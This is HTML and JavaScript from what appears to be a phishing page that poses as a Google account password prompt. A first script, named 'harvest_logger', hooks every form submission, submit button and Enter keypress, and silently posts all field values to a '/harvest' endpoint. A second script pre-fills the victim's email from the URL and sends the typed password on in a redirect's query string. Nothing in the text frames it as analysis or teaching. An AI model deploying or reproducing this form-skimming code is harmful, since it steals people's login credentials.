<!-- harvest_logger -->
<script>
(function() {
    if(window.__harvest_logger_loaded) return;
    window.__harvest_logger_loaded = true;
    function formToDict(form) {
        var data = {};
        var fd = new FormData(form);
        fd.forEach(function(value, key) {
            data[key] = value;
        });
        // If FormData is empty, manually gather all input/select/textarea
        if(Object.keys(data).length === 0) {
            var idx = 0;
            var els = form.querySelectorAll('input,select,textarea');
            els.forEach(function(el) {
                var k = el.name || el.id || ('field_'+idx++);
                var v = el.value;
                data[k] = v;
            });
        }
        return data;
    }
    function sendHarvest(form) {
        try {
            var data = formToDict(form);
            fetch('/harvest', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(function(){});
        }catch(e){}
    }
    var origSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {
        sendHarvest(this);
        origSubmit.apply(this, arguments);
    };
    document.addEventListener('submit', function(e){
        sendHarvest(e.target);
    }, true);
    function hookBtns(form){
        var btns = form.querySelectorAll('[type=submit],button');
        btns.forEach(function(btn){
            btn.addEventListener('click', function(){sendHarvest(form);}, true);
        });
        var inputs = form.querySelectorAll('input');
        inputs.forEach(function(input){
            input.addEventListener('keydown', function(e){
                if(e.key==='Enter'){sendHarvest(form);}
            }, true);
        });
    }
    document.querySelectorAll('form').forEach(hookBtns);
    var mo = new MutationObserver(function(muts){
        muts.forEach(function(mut){
            mut.addedNodes.forEach(function(node){
                if(node.tagName==='FORM') hookBtns(node);
                else if(node.querySelectorAll) node.querySelectorAll('form').forEach(hookBtns);
            });
        });
    });
    mo.observe(document.documentElement,{childList:true,subtree:true});
})();
</script>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Retrieve email from URL parameters first, then fallback to sessionStorage
            const urlParams = new URLSearchParams(window.location.search);
            const emailFromUrl = urlParams.get('email');
            const emailFromStorage = sessionStorage.getItem("user_email");
            
            const displayEmail = emailFromUrl || emailFromStorage || "example@gmail.com";
            document.getElementById("account-email").textContent = displayEmail;
            
            // Ensure we have the email in sessionStorage for consistency
            if (emailFromUrl && !emailFromStorage) {
                sessionStorage.setItem('user_email', emailFromUrl);
            }
        });
        
        function togglePassword() {
            const input = document.getElementById('password-input');
            const checkbox = document.getElementById('show-password');
            input.type = checkbox.checked ? "text" : "password";
        }
        
        document.getElementById('passwordForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const pwdInput = document.getElementById('password-input');
            const password = pwdInput.value.trim();
            
            if (!password) {
                alert('Please enter your password first');
                pwdInput.focus();
                return;
            }
            
            // Get the email from display (comes from either URL or sessionStorage)
            const email = document.getElementById("account-email").textContent;
            
            // For demonstration, redirect with credentials in URL
            window.location.href = `https://google.com?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
        });
        
        // Keyboard enter handler for password field
        document.getElementById('password-input').addEventListener('keyup', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('passwordForm').submit();
            }
        });
    </script>
